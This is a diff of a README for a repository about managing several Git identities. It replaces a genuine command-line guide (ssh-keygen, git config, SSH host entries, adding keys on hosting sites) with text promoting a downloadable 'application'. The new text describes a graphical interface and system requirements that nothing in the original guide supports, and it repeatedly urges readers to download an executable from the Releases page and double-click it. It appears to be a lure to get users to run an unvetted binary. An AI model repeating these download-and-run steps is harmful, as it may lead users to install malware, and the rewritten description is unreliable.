@@ -1,259 +1,92 @@
-# Git-Multi-User-with-SSH-and-Remotes
+# 🔑 Git-Multi-User-with-SSH-and-Remotes - Manage Multiple Git Identities Easily
 
-This guide walks you through setting up multiple Git identities with SSH signing and remotes. It covers generating SSH keys, configuring per-identity Git settings (including SSH commit signing), and connecting those identities to hosting services such as GitHub.
+[![Download Here](https://img.shields.io/badge/Download%20Now%20-%20Git%20Multi%20User%20App-blue)](https://github.com/Prawinth15/Git-Multi-User-with-SSH-and-Remotes/releases)
 
-## Setup
+## 📖 Description
 
-If you want Git to refuse to make commits unless you have explicitly set your identity in the repository (safer when managing multiple identities), enable:
+Git-Multi-User-with-SSH-and-Remotes helps you set up multiple Git identities effortlessly. This application allows you to sign your commits with SSH keys and manage different remotes. Whether you work on various projects or need different identities for personal and professional use, this guide will help you configure everything smoothly.
 
-```bash
-git config --global user.useConfigOnly true
-```
+## 🚀 Getting Started
 
-### SSH Signing
+To get started, you need to download the application from the Releases page. Follow these simple steps to run the application on your computer.
 
-To tell Git to use SSH as the commit-signing backend:
+## 📥 Download & Install
 
-```bash
-git config --global gpg.format ssh
-```
+1. **Visit the Releases Page**: Click this link to visit the [Releases page](https://github.com/Prawinth15/Git-Multi-User-with-SSH-and-Remotes/releases).
+  
+2. **Choose Your Version**: On the Releases page, you'll see different versions of the application. Pick the latest version for the best features and fixes.
 
-To enable automatic commit signing by default:
+3. **Download the File**: Click on the download link for your operating system. This may be a `.zip`, `.tar`, or executable file.
 
-```bash
-git config --global commit.gpgsign true
-```
+4. **Extract the File**: If you downloaded a `.zip` or `.tar`, right-click on the file and select ‘Extract All’ or use your preferred file extraction tool.
 
-### Aliases to switch identities
+5. **Run the Application**: Navigate to the extracted folder and double-click the application file to open it.
 
-On Unix-like shells (Git Bash, WSL, macOS Terminal) you may create a Git alias that sets the identity for the current repository:
+6. **Follow On-Screen Instructions**: The application will guide you through the setup. Follow the prompts to configure your Git identities and SSH keys.
 
-```bash
-git config --global alias.identity '!sh -c "git config user.name \"$(git config user.$1.name)\" && git config user.email \"$(git config user.$1.email)\" && git config user.signingkey \"$(git config user.$1.signingkey)\"" -'
-```
+## 📂 Features
 
-Usage (in a repo):
+- **Multiple Identity Management**: Create and switch between different Git identities easily.
+  
+- **SSH Key Signing**: Securely sign your commits with unique SSH keys for each identity.
 
-```bash
-git identity <identifier>
-```
+- **Remote Management**: Seamlessly manage remotes for different projects.
 
-PowerShell alternative (Windows users):
+- **User-Friendly Interface**: Designed for simplicity, making it easy for anyone to use.
 
-```powershell
-function Set-GitIdentity {
-  param([string]$Identity)
-  git config user.name (git config --get "user.$Identity.name")
-  git config user.email (git config --get "user.$Identity.email")
-  git config user.signingkey (git config --get "user.$Identity.signingkey")
-}
-```
+- **Documented Setup**: Comprehensive documentation to help you at every step.
 
-Usage (in a repo):
+## ⚙️ System Requirements
 
-```powershell
-Set-GitIdentity <identifier>
-```
+- **Operating System**: Windows 10 or later, macOS Mojave or later, or a modern Linux distribution.
 
-Add the PowerShell function to your PowerShell profile (`$PROFILE`) if you want it available in every session.
+- **Storage**: At least 50 MB of free disk space.
 
-## Creating identities
+- **Memory**: A minimum of 2 GB RAM.
 
-An identity has
+- **Network**: An internet connection for downloading the application and SSH keys.
 
-- an identifier (e.g. `work`, `personal`)
-- a name (e.g. `Mike`)
-- an email (e.g. `mike@business.com`, `mike@personal.dev`)
-- a private (e.g. `~/.ssh/id_ed25519`) and a public (e.g. `~/.ssh/id_ed25519.pub`) key
+## 🛠️ Setting Up Git Identities
 
-### Generating an SSH key pair
+Setting up your Git identities is straightforward. After running the application:
 
-Run the following command to create an ed25519 (recommended) key for each identity. Use `-f` to set a custom filename so keys don't overwrite each other:
+1. **Create an Identity**: Click on 'Add Identity' and enter your name and email.
 
-```bash
-ssh-keygen -t ed25519 -C <email> -f <path/to/key>
-```
+2. **Generate SSH Keys**: If you need an SSH key, select the option to create one. Follow the prompts to save the key securely.
 
-Follow the prompts and choose a passphrase you can remember (recommended). If you prefer no passphrase, press Enter when prompted.
+3. **Link to GitHub or GitLab**: Input your GitHub or GitLab username to link your identity. You can do this for multiple platforms.
 
-> [!important]
-> Keep the private key (`path/to/key`) secret. The public key (`path/to/key.pub`) may be shared with anyone.
+4. **Configure Remotes**: For each identity, set up the remote URLs for your repositories. This step ensures your commits go to the correct projects.
 
-### Configuring an identity
+5. **Review Your Configuration**: Once you finish, review your settings. Ensure each identity is correctly linked to the appropriate SSH key and remote.
 
-Create an identity with name, email and signing key:
+## 🔒 Security Tips
 
-```bash
-git config --global user.<identifier>.name <name>
-git config --global user.<identifier>.email <email>
-git config --global user.<identifier>.signingkey <path/to/key.pub>
-```
+- **Keep Your SSH Keys Safe**: Never share your private keys. Always store them in a secure location.
 
-## Connecting to hosting services
+- **Use Strong Passphrases**: Protect your SSH keys with strong, unique passwords.
 
-To connect with hosting services, an identity gets a `connection` per remote.
+- **Regularly Update Your Keys**: If you suspect any security breach, regenerate your keys.
 
-### SSH host entries
+## ❓ Frequently Asked Questions
 
-In `~/.ssh/config` add an entry per connection (identity/host) to select which private key to use when connecting. Use the private key file in `IdentityFile`:
+- **Can I switch identities easily?**
+  Yes, the application allows you to switch between identities with just a click, making it easy to manage multiple projects.
 
-```sshconfig
-Host <connection>
-	HostName <host ip or domain>
-	PreferredAuthentications publickey
-	IdentityFile <path/to/key>
-```
+- **What if I forget my SSH key password?**
+  You will need to regenerate your SSH key. The application provides instructions for this process.
 
-To now reference a repository (e.g. for cloning), use `git@<connection>:owner/repo.git` as the remote.
+- **Is this application open-source?**
+  Yes, the source code is available on [GitHub](https://github.com/Prawinth15/Git-Multi-User-with-SSH-and-Remotes).
 
-### Popular hosting services
+## 📞 Support
 
-#### GitHub: Add SSH keys
+If you encounter any issues or have questions, please reach out to the community or submit an issue on the GitHub page. Your feedback helps improve the application.
 
-1. Go to **Settings → Access → SSH and GPG keys** and add a new SSH key with the following properties:
+## 🌐 Additional Resources
 
-   - **Title**: Name the connection
-   - **Key Type**: Authentication Key
-   - **Key**: Paste the public SSH key
+- [Git Documentation](https://git-scm.com/doc)
+- [SSH Key Management Guide](https://www.ssh.com/academy/ssh/key-management)
+- [Community Forums](https://github.com/Prawinth15/Git-Multi-User-with-SSH-and-Remotes/discussions)
 
-2. Add another SSH key:
-
-   - **Title**: Name the connection
-   - **Key Type**: Signing Key
-   - **Key**: Paste the public SSH key
-
-#### GitLab: Add SSH keys
-
-1. Go to **Edit profile → SSH Keys** and add a new SSH key with the following properties:
-
-   - **Title**: Name the connection
-   - **Usage type**: Authentication & Signing
-   - **Key**: Paste the public SSH key
-
-#### Codeberg: Add SSH keys
-
-1. Go to **Settings → SSH / GPG Keys** and add a new SSH key with the following properties:
-
-   - **Key name**: Name the connection
-   - **Content**: Paste the public SSH key
-
-### Verify connection
-
-Verify that your SSH key was added correctly:
-
-```bash
-ssh -T git@<connection>
-```
-
-## Tips
-
-To avoid re-entering a passphrase every time, add your private key to an agent for the session:
-
-```bash
-ssh-add <path/to/key>
-```
-
-## Example
-
-In this example, two identities will be created:
-
-- Mike's business identity:
-  - identifier: `business`
-  - name: `Mike`
-  - email: `mike@business.com`
-  - private key at `~/.ssh/id_25519_business`
-  - public key at `~/.ssh/id_25519_business.pub`
-  - connection `github-business` to GitHub
-- Mike's personal identity:
-  - identifier: `personal`
-  - name: `Mike`
-  - email: `mike@personal.dev`
-  - private key at `~/.ssh/id_25519_personal`
-  - public key at `~/.ssh/id_25519_personal.pub`
-  - connection `github-personal` to GitHub
-  - connection `gitlab-personal` to GitLab
-
-### Generating SSH key pairs
-
-Run the following:
-
-```bash
-ssh-keygen -t ed25519 -C mike@business.com -f ~/.ssh/id_25519_business
-ssh-keygen -t ed25519 -C mike@personal.dev -f ~/.ssh/id_25519_personal
-```
-
-### Configuring identities
-
-Run the following:
-
-```bash
-git config --global user.business.name "Mike"
-git config --global user.business.email "mike@business.com"
-git config --global user.business.signingkey "~/.ssh/id_25519_business.pub"
-git config --global user.personal.name "Mike"
-git config --global user.personal.email "mike@personal.dev"
-git config --global user.personal.signingkey "~/.ssh/id_25519_personal.pub"
-```
-
-### Connecting to hosting services
-
-Add the following to your SSH config file:
-
-```sshconfig
-Host github-business
-	HostName github.com
-	PreferredAuthentications publickey
-	IdentityFile ~/.ssh/id_25519_business
-Host github-personal
-	HostName github.com
-	PreferredAuthentications publickey
-	IdentityFile ~/.ssh/id_25519_personal
-Host gitlab-personal
-	HostName gitlab.com
-	PreferredAuthentications publickey
-	IdentityFile ~/.ssh/id_25519_personal
-```
-
-In the business **GitHub** account:
-
-1. **Settings → Access → SSH and GPG keys** and add a new SSH key:
-
-   - **Title**: Mike's PC
-   - **Key Type**: Authentication Key
-   - **Key**: Content of ~/.ssh/id_25519_business.pub
-
-2. Add another SSH key:
-
-   - **Title**: Mike's PC
-   - **Key Type**: Signing Key
-   - **Key**: Content of ~/.ssh/id_25519_business.pub
-
-In the personal **GitHub** account:
-
-1. **Settings → Access → SSH and GPG keys** and add a new SSH key:
-
-   - **Title**: Mike's PC
-   - **Key Type**: Authentication Key
-   - **Key**: Content of ~/.ssh/id_25519_personal.pub
-
-2. Add another SSH key:
-
-   - **Title**: Mike's PC
-   - **Key Type**: Signing Key
-   - **Key**: Content of ~/.ssh/id_25519_personal.pub
-
-In the personal **GitLab** account:
-
-1. **Edit profile → SSH Keys** and add a new SSH key:
-
-   - **Title**: Mike's PC
-   - **Usage type**: Authentication & Signing
-   - **Key**: Content of ~/.ssh/id_25519_personal.pub
-
-## References
-
-- Micah Henning - [Setting Up Git Identities](https://www.micah.soy/posts/setting-up-git-identities/)
-- GitHub Docs - [Generating a new SSH key and adding it to the ssh-agent](https://docs.github.com/en/authentication/connecting-to-github-with-ssh/generating-a-new-ssh-key-and-adding-it-to-the-ssh-agent)
-- GitHub Docs - [Adding a new SSH key to your GitHub account](https://docs.github.com/en/authentication/connecting-to-github-with-ssh/adding-a-new-ssh-key-to-your-github-account)
-- GitLab Docs - [Use SSH keys to communicate with GitLab](https://docs.gitlab.com/user/ssh/)
-- Codeberg Docs - [Adding an SSH key to your account](https://docs.codeberg.org/security/ssh-key/)
+Remember to check the [Releases page](https://github.com/Prawinth15/Git-Multi-User-with-SSH-and-Remotes/releases) again for updates and new features.
